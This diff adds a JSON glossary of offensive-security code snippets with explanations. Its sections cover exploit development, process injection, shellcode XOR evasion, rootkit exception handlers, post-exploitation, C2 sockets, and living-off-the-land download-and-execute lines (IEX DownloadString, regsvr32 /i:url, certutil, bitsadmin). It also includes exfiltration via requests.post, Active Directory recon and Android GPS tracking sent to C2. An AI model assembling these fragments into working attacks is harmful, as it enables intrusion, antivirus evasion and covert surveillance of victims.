@@ -1,0 +1,171 @@
+{
+  "05_EXPLOIT_DEVELOPMENT": {
+    "languages": ["C", "x64 Assembly"],
+    "entries": [
+      {"term": "char buf[256]",        "lang": "C",   "meaning": "Fixed-size buffer on the stack — 256 bytes reserved. No bounds check built in. Write past 256 and you overwrite the return address."},
+      {"term": "memcpy(dst,src,n)",    "lang": "C",   "meaning": "Copy n bytes from src to dst. No safety check. Pass a size larger than the buffer and you've got a stack overflow."},
+      {"term": "void *ptr",            "lang": "C",   "meaning": "Pointer to anything — no type enforced. You decide what it points to when you dereference it."},
+      {"term": "*(int*)addr",          "lang": "C",   "meaning": "Dereference: read the 4 bytes at memory address addr and interpret them as an integer."},
+      {"term": "rsp",                  "lang": "x64", "meaning": "Stack Pointer register. Always points to the top of the call stack. Subtract from rsp to make space; add to shrink."},
+      {"term": "ret",                  "lang": "x64", "meaning": "Pop return address off the stack, jump to it. If you controlled that address, you control execution."},
+      {"term": "0x90 (nop)",           "lang": "x64", "meaning": "No-operation instruction — CPU does nothing, moves to next byte. Used as a sled: slide execution toward shellcode."}
+    ]
+  },
+  "07_EXPLOIT_PRIMITIVES": {
+    "languages": ["C"],
+    "entries": [
+      {"term": "read_primitive(addr)",  "lang": "C", "meaning": "Controlled read: you can read any memory address. Leak a pointer → defeat ASLR."},
+      {"term": "write_primitive(addr)", "lang": "C", "meaning": "Controlled write: you can write any value to any address. Overwrite a function pointer → control execution."},
+      {"term": "VirtualAlloc(NULL,size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)", "lang": "C", "meaning": "Ask Windows for executable memory. The PAGE_EXECUTE_READWRITE flag means you can write shellcode there and then run it."},
+      {"term": "DWORD",                 "lang": "C", "meaning": "Windows type alias for unsigned 32-bit integer (0 to 4,294,967,295). Used everywhere in the Win32 API."}
+    ]
+  },
+  "08_PRIVILEGE_ESCALATION": {
+    "languages": ["PowerShell", "C"],
+    "entries": [
+      {"term": "Get-WmiObject Win32_Service",     "lang": "PowerShell", "meaning": "Query WMI for a list of all Windows services — same data as services.msc but scriptable."},
+      {"term": "Where-Object { $_.Prop -eq 'x' }","lang": "PowerShell", "meaning": "Filter pipeline: only pass through objects where the condition is true. $_ means 'current object'."},
+      {"term": "ForEach-Object { ... }",           "lang": "PowerShell", "meaning": "Loop over every item in the pipeline and run the block for each one."},
+      {"term": "$acl.Access",                      "lang": "PowerShell", "meaning": "Windows access control list: an array of who has what permissions on a file, folder or registry key."},
+      {"term": "FileSystemRights -match 'Write'",  "lang": "PowerShell", "meaning": "Regex match on the permission flags. Matches Write, FullControl, Modify — anything that lets you overwrite a file."}
+    ]
+  },
+  "09_MALWARE_DEVELOPMENT": {
+    "languages": ["C"],
+    "entries": [
+      {"term": "typedef LPVOID(WINAPI *pVirtualAlloc)(...)", "lang": "C", "meaning": "Defines a new type called pVirtualAlloc that is a pointer to a function with that signature. You can then call it like a normal function."},
+      {"term": "GetModuleHandleA(\"kernel32.dll\")",          "lang": "C", "meaning": "Get a handle (reference) to a DLL that's already loaded in the current process. Returns NULL if not loaded."},
+      {"term": "GetProcAddress(hMod, \"FunctionName\")",      "lang": "C", "meaning": "Look up a function's address inside a loaded DLL by its name string. Returns a void* — cast it to your function pointer type."},
+      {"term": "LPVOID, SIZE_T, DWORD",                      "lang": "C", "meaning": "Windows type aliases: LPVOID = void pointer, SIZE_T = size in bytes (platform-wide), DWORD = unsigned 32-bit int."},
+      {"term": "#include <windows.h>",                        "lang": "C", "meaning": "Include the Windows SDK header — brings in all Win32 API types, macros, and function declarations in one line."}
+    ]
+  },
+  "10_CODE_INJECTION": {
+    "languages": ["C"],
+    "entries": [
+      {"term": "OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)", "lang": "C", "meaning": "Get a handle to another running process by its PID. PROCESS_ALL_ACCESS means you're requesting full control. Requires matching privilege level."},
+      {"term": "VirtualAllocEx(hProc, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)", "lang": "C", "meaning": "Allocate executable memory inside ANOTHER process. The Ex suffix means it works cross-process. This is where your shellcode will live."},
+      {"term": "WriteProcessMemory(hProc, addr, buf, size, NULL)", "lang": "C", "meaning": "Write bytes from your process into another process's memory at the address you allocated. No read — this is a write. Your shellcode goes in here."},
+      {"term": "CreateRemoteThread(hProc, NULL, 0, addr, NULL, 0, NULL)", "lang": "C", "meaning": "Spawn a new thread inside another process, starting execution at addr. That address is your shellcode. The target process now runs your code."}
+    ]
+  },
+  "11_ROOTKITS": {
+    "languages": ["C", "C++"],
+    "entries": [
+      {"term": "PEXCEPTION_POINTERS ex",             "lang": "C", "meaning": "Pointer to a structure describing a CPU exception (crash). Passed to your vectored exception handler — contains the exception code, the faulting address, and the full CPU register state at the time of the fault."},
+      {"term": "ex->ContextRecord->Rax",             "lang": "C", "meaning": "Access the RAX register value captured when the exception fired. You can read OR write it — writing lets you change what value the instruction returns."},
+      {"term": "AddVectoredExceptionHandler(1, fn)", "lang": "C", "meaning": "Register fn as the first handler called when ANY CPU exception occurs. 1 = call it first. Your handler runs before Windows' default handling."},
+      {"term": "DR0 (hardware debug register)",      "lang": "C", "meaning": "A CPU register that, when set to an address, causes the CPU to fire a debug exception (#DB) when execution reaches that address. Set via SetThreadContext or kernel — no memory modification required."},
+      {"term": "EXCEPTION_SINGLE_STEP",              "lang": "C", "meaning": "The exception code fired when a hardware debug breakpoint is hit. Your VEH handler checks for this code to know it was your breakpoint, not a random crash."}
+    ]
+  },
+  "12_ANTIVIRUS_EVASION": {
+    "languages": ["C"],
+    "entries": [
+      {"term": "BYTE buf[] = {0xFC, 0x48, ...}",    "lang": "C", "meaning": "Shellcode as a raw byte array. Each hex value is one CPU instruction byte. This is what the CPU actually executes — no function names, no strings."},
+      {"term": "buf[i] ^= key",                     "lang": "C", "meaning": "XOR each byte with key. The ^ operator is bitwise exclusive-or: flips bits where key is 1. XOR twice with the same key restores the original. Breaks static pattern matching."},
+      {"term": "for(int i=0; i<len; i++)",           "lang": "C", "meaning": "Loop from 0 to len-1. i is the index. Runs the body once per byte in the buffer — standard iteration over an array."},
+      {"term": "void (*fn)(void) = (void(*)())buf",  "lang": "C", "meaning": "Cast the byte array to a function pointer, then call it. The CPU treats those bytes as instructions and executes them directly. This is how shellcode runs."}
+    ]
+  },
+  "14_REVERSE_ENGINEERING": {
+    "languages": ["Python"],
+    "entries": [
+      {"term": "import struct",              "lang": "Python", "meaning": "Module for packing/unpacking binary data. Lets you read raw bytes from a file and interpret them as integers, addresses, or structs."},
+      {"term": "struct.unpack('<I', data)",  "lang": "Python", "meaning": "Unpack 4 bytes from data as a little-endian unsigned 32-bit int. < means little-endian (Intel byte order). I means unsigned int. Returns a tuple — use [0] to get the value."},
+      {"term": "f.read(n)",                 "lang": "Python", "meaning": "Read exactly n bytes from a file handle. Returns a bytes object. Call after f = open('file', 'rb') for binary mode."},
+      {"term": "hex(x)",                    "lang": "Python", "meaning": "Convert integer x to a hex string like '0x1a3f'. Useful for displaying addresses and offsets."},
+      {"term": "data[n:m]",                 "lang": "Python", "meaning": "Slice: take bytes from index n up to (not including) m. data[0:2] gives the first 2 bytes — the PE MZ magic number."}
+    ]
+  },
+  "15_POST_EXPLOITATION": {
+    "languages": ["PowerShell", "Python"],
+    "entries": [
+      {"term": "Invoke-WebRequest -Uri url -OutFile f", "lang": "PowerShell", "meaning": "Download a file from a URL and save it. Equivalent to wget. Commonly used for stage-2 payload pull."},
+      {"term": "[System.Net.WebClient]",                "lang": "PowerShell", "meaning": "Built-in .NET class for HTTP. More flexible than Invoke-WebRequest. Can download to memory: (New-Object Net.WebClient).DownloadString(url)"},
+      {"term": "$env:COMPUTERNAME, $env:USERNAME",      "lang": "PowerShell", "meaning": "Environment variables: current machine name and logged-in username. Fast, no WMI query needed."},
+      {"term": "net user /domain",                      "lang": "CMD", "meaning": "List all users in the Active Directory domain. Classic post-exploitation recon — no PowerShell required."},
+      {"term": "requests.post(url, data=payload)",      "lang": "Python", "meaning": "HTTP POST request. Used in C2 exfil: POST stolen data to your listener endpoint."}
+    ]
+  },
+  "16_COMMAND_AND_CONTROL": {
+    "languages": ["C", "Python"],
+    "entries": [
+      {"term": "socket(AF_INET, SOCK_STREAM, 0)",           "lang": "C",      "meaning": "Create a TCP socket. AF_INET = IPv4, SOCK_STREAM = reliable ordered connection (TCP). Returns a file descriptor."},
+      {"term": "connect(sock, &addr, sizeof(addr))",        "lang": "C",      "meaning": "Connect the socket to a remote address. addr contains the IP and port. If your listener is running on that address, you now have a C2 channel."},
+      {"term": "send(sock, buf, len, 0)",                   "lang": "C",      "meaning": "Send len bytes from buf over the socket. 0 = default flags. This is how your beacon sends results back to the operator."},
+      {"term": "import socket; s.connect((ip, port))",      "lang": "Python", "meaning": "Python TCP connect — same concept, fewer lines. Useful for scripting quick C2 listeners."},
+      {"term": "s.recv(1024)",                              "lang": "Python", "meaning": "Receive up to 1024 bytes from the socket. Blocks until data arrives. Returns bytes — decode to string if needed."}
+    ]
+  },
+  "17_NETWORK_WARFARE": {
+    "languages": ["Python", "PowerShell"],
+    "entries": [
+      {"term": "socket.setblocking(False)",              "lang": "Python",    "meaning": "Non-blocking mode — recv() returns immediately even if no data. Use with select() for multiplexing multiple connections."},
+      {"term": "struct.pack('>H', port)",                "lang": "Python",    "meaning": "Pack a 16-bit port number as big-endian bytes. Used when building raw IP/TCP packets manually."},
+      {"term": "netsh interface portproxy add ...",      "lang": "CMD",       "meaning": "Windows built-in port forwarding — redirect a port from one address to another. Living-off-the-land pivoting tool."},
+      {"term": "Test-NetConnection -Port 445",           "lang": "PowerShell","meaning": "Check if a remote port is open. Equivalent to netcat -z. Use for enumerating open SMB/WinRM/RDP ports across subnet."},
+      {"term": "New-Object Net.Sockets.TcpClient",       "lang": "PowerShell","meaning": "Open a TCP connection in PowerShell. Used for tunnelling or testing connectivity from a compromised host."}
+    ]
+  },
+  "18_CRYPTOGRAPHY_EVASION": {
+    "languages": ["C", "Python"],
+    "entries": [
+      {"term": "key ^ 0xFF",                             "lang": "C",      "meaning": "XOR with 0xFF flips all 8 bits — turns every byte into its bitwise complement. Simple single-byte key."},
+      {"term": "for(i=0;i<len;i++) buf[i]^=key[i%klen]","lang": "C",      "meaning": "Rolling XOR with a multi-byte key. i%klen cycles through the key bytes repeatedly across the entire buffer."},
+      {"term": "base64.b64encode(data)",                 "lang": "Python", "meaning": "Encode bytes to base64 string. Looks like random text, avoids binary bytes in transit. Not encryption — trivially decoded."},
+      {"term": "hashlib.md5(data).hexdigest()",          "lang": "Python", "meaning": "Compute MD5 hash of data as a hex string. Used for checksums, key derivation, or verifying payload integrity."},
+      {"term": "os.urandom(n)",                          "lang": "Python", "meaning": "Generate n cryptographically random bytes. Use for key generation — never use random.random() for crypto."}
+    ]
+  },
+  "19_LIVING_OFF_THE_LAND": {
+    "languages": ["PowerShell", "CMD"],
+    "entries": [
+      {"term": "IEX (Invoke-Expression)",                "lang": "PowerShell", "meaning": "Execute a string as PowerShell code at runtime. IEX (New-Object Net.WebClient).DownloadString(url) downloads and runs a script in one line — nothing written to disk."},
+      {"term": "[Convert]::FromBase64String(str)",        "lang": "PowerShell", "meaning": "Decode a base64 string to raw bytes in PowerShell. Chain with IEX to run encoded payloads from memory."},
+      {"term": "certutil -decode in.b64 out.exe",         "lang": "CMD",        "meaning": "Built-in Windows certificate utility — also decodes base64 files. Commonly used to drop a binary from a text transfer."},
+      {"term": "bitsadmin /transfer job /download url f", "lang": "CMD",        "meaning": "Background Intelligent Transfer Service — a built-in download manager. Bypasses simple web proxies. Logs go to BITS event log, not browser history."},
+      {"term": "regsvr32 /s /n /u /i:url scrobj.dll",    "lang": "CMD",        "meaning": "Register a COM object — but /i:url fetches a .sct script from a URL and executes it. No file on disk. Bypasses AppLocker (application whitelisting)."}
+    ]
+  },
+  "20_ACTIVE_DIRECTORY": {
+    "languages": ["PowerShell"],
+    "entries": [
+      {"term": "Import-Module ActiveDirectory",             "lang": "PowerShell", "meaning": "Load the AD module — available on domain-joined machines with RSAT or DCs. Needed for Get-ADUser, Get-ADGroup etc."},
+      {"term": "Get-ADUser -Filter * -Properties *",        "lang": "PowerShell", "meaning": "Pull all users from the domain with all attributes. -Filter * = no filter. -Properties * = include non-default attributes like LastLogon, ServicePrincipalName."},
+      {"term": "[adsisearcher]",                            "lang": "PowerShell", "meaning": "Built-in ADSI searcher — works WITHOUT the AD module, available on any domain-joined machine. Useful when RSAT isn't installed."},
+      {"term": "net group 'Domain Admins' /domain",         "lang": "CMD",        "meaning": "List all members of Domain Admins. Classic recon — no imports, works from any domain-joined cmd.exe."},
+      {"term": "setspn -Q */*",                             "lang": "CMD",        "meaning": "List all Service Principal Names on the domain. SPNs mark accounts as Kerberos service accounts — targets for Kerberoasting."}
+    ]
+  },
+  "21_MOBILE_SECURITY": {
+    "languages": ["Java", "Kotlin"],
+    "entries": [
+      {"term": "getSystemService(LocationManager.class)", "lang": "Java",   "meaning": "Ask Android for the GPS/location service. Returns a LocationManager object you use to register for location updates."},
+      {"term": "requestLocationUpdates(provider, 0, 0, cb)","lang": "Java", "meaning": "Register a callback that fires every time the GPS position updates. 0 ms interval = as fast as possible. Your callback receives Location objects."},
+      {"term": "location.getLatitude() / getLongitude()",  "lang": "Java",  "meaning": "Extract decimal latitude and longitude from a Location object. Convert to DMS coordinates or send raw."},
+      {"term": "Socket(ip, port)",                         "lang": "Java",  "meaning": "Java TCP socket — same concept as C but exception-safe. Use with InputStream/OutputStream for C2 communication."},
+      {"term": "AndroidManifest.xml permissions",          "lang": "XML",   "meaning": "App permissions are declared here. ACCESS_FINE_LOCATION, READ_CONTACTS, CAMERA. Without the declaration, Android blocks the API call. With it, Android asks the user — or auto-grants on install depending on version."}
+    ]
+  },
+  "22_OSINT_SOCIAL_ENGINEERING": {
+    "languages": ["Python"],
+    "entries": [
+      {"term": "import whois; whois.whois('domain')",  "lang": "Python", "meaning": "Look up domain registration data: registrant name, email, registration date, name servers. Often reveals org names and contact info."},
+      {"term": "socket.gethostbyname('example.com')", "lang": "Python", "meaning": "DNS lookup — resolve a hostname to an IP address. First step in mapping a target's infrastructure."},
+      {"term": "requests.get(url, timeout=5)",         "lang": "Python", "meaning": "HTTP GET request with a 5-second timeout. Use for scraping, banner grabbing, or checking if a URL is live."},
+      {"term": "response.headers",                     "lang": "Python", "meaning": "HTTP response headers — often leaks server software, framework versions, CDN provider, and sometimes internal hostnames."},
+      {"term": "json.loads(response.text)",            "lang": "Python", "meaning": "Parse a JSON string into a Python dictionary. Most modern APIs return JSON — use this to access individual fields."}
+    ]
+  },
+  "02_RECON_FOOTPRINTING": {
+    "languages": ["Python", "PowerShell"],
+    "entries": [
+      {"term": "socket.getaddrinfo(host, None)",   "lang": "Python",    "meaning": "Get all IP addresses for a hostname — returns IPv4 and IPv6. More complete than gethostbyname."},
+      {"term": "dns.resolver.resolve('x','MX')",   "lang": "Python",    "meaning": "Query DNS for a specific record type. MX = mail servers (useful for email infrastructure mapping). Requires dnspython."},
+      {"term": "requests.head(url)",               "lang": "Python",    "meaning": "HTTP HEAD request — fetches only headers, no body. Fast way to check a URL and read server headers without downloading the page."},
+      {"term": "nmap -sV -p- target",              "lang": "CMD",       "meaning": "Port scan: -p- scans all 65535 ports, -sV tries to identify the service version running on each open port."},
+      {"term": "Resolve-DnsName domain -Type ANY", "lang": "PowerShell","meaning": "PowerShell DNS lookup for all record types. Returns A, MX, TXT, NS records — maps the target's external DNS footprint."}
+    ]
+  }
+}
